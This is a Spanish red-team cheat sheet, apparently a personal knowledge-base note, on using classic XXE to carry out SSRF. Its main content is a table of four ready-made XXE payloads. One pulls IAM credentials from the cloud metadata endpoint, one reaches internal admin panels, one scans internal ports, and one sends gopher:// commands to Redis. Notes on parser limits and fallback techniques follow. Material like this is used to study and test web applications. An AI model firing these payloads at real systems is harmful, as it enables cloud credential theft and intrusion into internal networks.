---
aliases: null
tags:
  - type/technique
  - vuln/xxe
  - technique/execution
  - asset/web-app
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Explotación]]'
tertiary categories:
  - '[[Web Explotación]]'
type: SubCheatSheet
linked:
  - '[[XML External Entity (XXE)]]'
---
# XXE - Clásico SSRF

***

## Cheatsheet

|**Objetivo Estratégico**|**Descripción de la Técnica**|**Estructura del Payload**|
|---|---|---|
|**Extracción de Metadatos de la Nube**|Apunto al endpoint de metadatos (`169.254.169.254`) en entornos cloud (AWS, GCP, Azure) para intentar exfiltrar credenciales de IAM, claves temporales o datos de despliegue.|`<!DOCTYPE foo [ <!ENTITY xxe-ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]><foo>&xxe-ssrf;</foo>`|
|**Acceso a Paneles Internos**|Dirijo la petición hacia servicios que asumen que el tráfico local es de confianza (como consolas de administración en `127.0.0.1`) para eludir firewalls perimetrales.|`<!DOCTYPE foo [ <!ENTITY xxe-ssrf SYSTEM "http://127.0.0.1:8080/admin/dashboard"> ]><foo>&xxe-ssrf;</foo>`|
|**Escaneo de Puertos y Red**|Itero sobre direcciones IP y puertos internos. Un puerto abierto refleja el banner o contenido; un puerto cerrado suele provocar un error de conexión en el XML o un timeout, actuando como oráculo.|`<!DOCTYPE foo [ <!ENTITY xxe-ssrf SYSTEM "http://192.168.1.10:22/"> ]><foo>&xxe-ssrf;</foo>`|
|**Explotación con Protocolos No-HTTP**|Utilizo esquemas URI alternativos soportados por el parser (como `gopher://` o `dict://` en entornos Java o PHP) para enviar comandos a servicios internos como Redis o Memcached.|`<!DOCTYPE foo [ <!ENTITY xxe-ssrf SYSTEM "gopher://127.0.0.1:6379/_INFO"> ]><foo>&xxe-ssrf;</foo>`|

## Restricciones Operativas

- **Caracteres Reservados:** Si el servicio interno contactado a través del SSRF devuelve datos que incluyen caracteres que rompen el formato XML (como `<` , `>` o `&`) y no están escapados en una sección `CDATA`, el analizador fallará, imposibilitando la lectura de la respuesta.
- **Soporte de Esquemas URI:** La capacidad de utilizar protocolos más allá de HTTP/HTTPS depende enteramente del lenguaje subyacente (Java, PHP, .NET) y de cómo esté configurado el analizador XML.
- **Ausencia de Reflejo:** Si la aplicación ejecuta la petición de red pero no devuelve el resultado en la respuesta HTTP, el ataque _in-band_ deja de ser útil. En tal escenario, la estrategia debe pivotar hacia técnicas de [[Blind SSRF]] o [[XXE Out-of-Band (OOB)]] basadas en tiempos de respuesta o interacciones DNS.

***

^xxe-clasico-ssrf

## Overview

La vulnerabilidad de [[XXE]] actúa como un vector directo para lograr un ataque de [[Server-Side Request Forgery (SSRF)]] (Server-Side Request Forgery) cuando se define el valor de una entidad externa utilizando una URL de red en lugar de una ruta de archivo local. Al operar en la variante clásica (_in-band_), el parser procesa la solicitud y el contenido de la respuesta de esa petición interna se incrusta en el nodo XML, reflejándose directamente en la respuesta HTTP que se recibe.


***

## Notas Relacionadas


***
